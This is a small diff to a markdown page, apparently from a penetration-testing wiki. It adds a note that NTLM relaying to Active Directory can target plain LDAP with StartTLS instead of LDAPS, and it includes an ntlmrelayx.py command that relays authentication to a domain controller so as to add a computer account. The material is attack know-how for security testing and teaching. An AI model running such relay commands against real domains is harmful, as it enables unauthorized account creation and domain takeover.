@@ -149,6 +149,14 @@ ntlmrelayx.py -t ldaps://$DC_TARGET
 {% hint style="info" %}
 In most cases, the `--remove-mic` option will be needed when relaying to LDAP(S) because of the [MIC protection](relay.md#mic-message-integrity-code).
 {% endhint %}
+
+{% hint style="info" %}
+Using LDAPS for that operation is not mandatory since Active Directory LDAP implements StartTLS. This is implemented in Impacket since April 30th 2022.
+
+```bash
+ntlmrelayx.py -t ldap://$DC_TARGET --add-computer SHUTDOWN
+```
+{% endhint %}
 {% endtab %}
 
 {% tab title="Promotion" %}
